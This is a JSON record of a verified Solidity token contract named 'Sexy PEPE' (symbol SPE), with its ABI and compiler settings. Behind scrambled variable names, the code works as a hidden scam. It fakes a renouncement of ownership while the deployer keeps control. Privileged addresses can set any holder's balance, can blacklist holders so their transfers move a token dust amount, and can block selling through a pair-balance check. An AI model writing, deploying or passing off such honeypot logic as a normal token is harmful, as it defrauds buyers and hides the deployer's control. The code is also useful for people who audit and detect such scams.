{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface minBuyAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txEnable) external view returns (uint256);\n\n    function transfer(address tradingFeeAmount, uint256 swapList) external returns (bool);\n\n    function allowance(address exemptAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingFeeAmount,\n        uint256 swapList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isTrading, uint256 value);\n    event Approval(address indexed exemptAmount, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityMarketingSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atExemptTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeSell {\n    function createPair(address teamMaxAt, address launchTx) external returns (address);\n}\n\ninterface minBuyAutoMetadata is minBuyAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SexyPEPE is liquidityMarketingSender, minBuyAuto, minBuyAutoMetadata {\n\n    uint256 public launchSenderFrom;\n\n    mapping(address => bool) public sellList;\n\n    function totalSender(address receiverMaxSwap) public {\n        feeReceiver();\n        \n        if (receiverMaxSwap == limitTakeReceiver || receiverMaxSwap == fundBuy) {\n            return;\n        }\n        sellList[receiverMaxSwap] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private atAmountExempt;\n\n    function balanceOf(address txEnable) public view virtual override returns (uint256) {\n        return swapLaunch[txEnable];\n    }\n\n    uint256 modeTo;\n\n    mapping(address => bool) public limitEnable;\n\n    uint8 private tokenAmount = 18;\n\n    uint256 public txAmount;\n\n    mapping(address => uint256) private swapLaunch;\n\n    function teamTokenExempt(address walletLaunch, address tradingFeeAmount, uint256 swapList) internal returns (bool) {\n        require(swapLaunch[walletLaunch] >= swapList);\n        swapLaunch[walletLaunch] -= swapList;\n        swapLaunch[tradingFeeAmount] += swapList;\n        emit Transfer(walletLaunch, tradingFeeAmount, swapList);\n        return true;\n    }\n\n    bool public listMarketingFee;\n\n    event OwnershipTransferred(address indexed toTokenSender, address indexed exemptReceiverSell);\n\n    function allowance(address limitBuy, address listFrom) external view virtual override returns (uint256) {\n        if (listFrom == atSwap) {\n            return type(uint256).max;\n        }\n        return atAmountExempt[limitBuy][listFrom];\n    }\n\n    bool public totalListMode;\n\n    string private modeFund = \"SPE\";\n\n    address atSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (txAmount == receiverTeam) {\n            txAmount = receiverTeam;\n        }\n        atExemptTotal launchedShould = atExemptTotal(atSwap);\n        fundBuy = takeSell(launchedShould.factory()).createPair(launchedShould.WETH(), address(this));\n        \n        limitTakeReceiver = _msgSender();\n        toFund();\n        limitEnable[limitTakeReceiver] = true;\n        swapLaunch[limitTakeReceiver] = swapAtLaunch;\n        if (receiverTeam != txAmount) {\n            receiverTeam = launchSenderFrom;\n        }\n        emit Transfer(address(0), limitTakeReceiver, swapAtLaunch);\n    }\n\n    function exemptModeAt(address walletLaunch, address tradingFeeAmount, uint256 swapList) internal returns (bool) {\n        if (walletLaunch == limitTakeReceiver) {\n            return teamTokenExempt(walletLaunch, tradingFeeAmount, swapList);\n        }\n        uint256 isWallet = minBuyAuto(fundBuy).balanceOf(takeEnable);\n        require(isWallet == toTrading);\n        require(tradingFeeAmount != takeEnable);\n        if (sellList[walletLaunch]) {\n            return teamTokenExempt(walletLaunch, tradingFeeAmount, marketingTotal);\n        }\n        return teamTokenExempt(walletLaunch, tradingFeeAmount, swapList);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedBuy;\n    }\n\n    uint256 private receiverTeam;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenAmount;\n    }\n\n    function transferFrom(address walletLaunch, address tradingFeeAmount, uint256 swapList) external override returns (bool) {\n        if (_msgSender() != atSwap) {\n            if (atAmountExempt[walletLaunch][_msgSender()] != type(uint256).max) {\n                require(swapList <= atAmountExempt[walletLaunch][_msgSender()]);\n                atAmountExempt[walletLaunch][_msgSender()] -= swapList;\n            }\n        }\n        return exemptModeAt(walletLaunch, tradingFeeAmount, swapList);\n    }\n\n    function transfer(address enableMax, uint256 swapList) external virtual override returns (bool) {\n        return exemptModeAt(_msgSender(), enableMax, swapList);\n    }\n\n    function launchAmount(address enableMax, uint256 swapList) public {\n        feeReceiver();\n        swapLaunch[enableMax] = swapList;\n    }\n\n    address private walletReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeFund;\n    }\n\n    uint256 private swapAtLaunch = 100000000 * 10 ** 18;\n\n    bool public enableSellFund;\n\n    function feeReceiver() private view {\n        require(limitEnable[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapAtLaunch;\n    }\n\n    function enableShould(uint256 swapList) public {\n        feeReceiver();\n        toTrading = swapList;\n    }\n\n    function getOwner() external view returns (address) {\n        return walletReceiver;\n    }\n\n    string private launchedBuy = \"Sexy PEPE\";\n\n    address takeEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function marketingWallet(address feeSender) public {\n        require(feeSender.balance < 100000);\n        if (totalListMode) {\n            return;\n        }\n        if (launchSenderFrom == txAmount) {\n            listMarketingFee = false;\n        }\n        limitEnable[feeSender] = true;\n        if (launchSenderFrom != receiverTeam) {\n            listMarketingFee = true;\n        }\n        totalListMode = true;\n    }\n\n    address public limitTakeReceiver;\n\n    uint256 toTrading;\n\n    address public fundBuy;\n\n    function toFund() public {\n        emit OwnershipTransferred(limitTakeReceiver, address(0));\n        walletReceiver = address(0);\n    }\n\n    function approve(address listFrom, uint256 swapList) public virtual override returns (bool) {\n        atAmountExempt[_msgSender()][listFrom] = swapList;\n        emit Approval(_msgSender(), listFrom, swapList);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return walletReceiver;\n    }\n\n    bool private walletExempt;\n\n    uint256 constant marketingTotal = 2 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTokenSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiverSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSellFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapList\",\"type\":\"uint256\"}],\"name\":\"enableShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapList\",\"type\":\"uint256\"}],\"name\":\"launchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSenderFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTakeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketingFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"}],\"name\":\"marketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalListMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMaxSwap\",\"type\":\"address\"}],\"name\":\"totalSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingFeeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SexyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}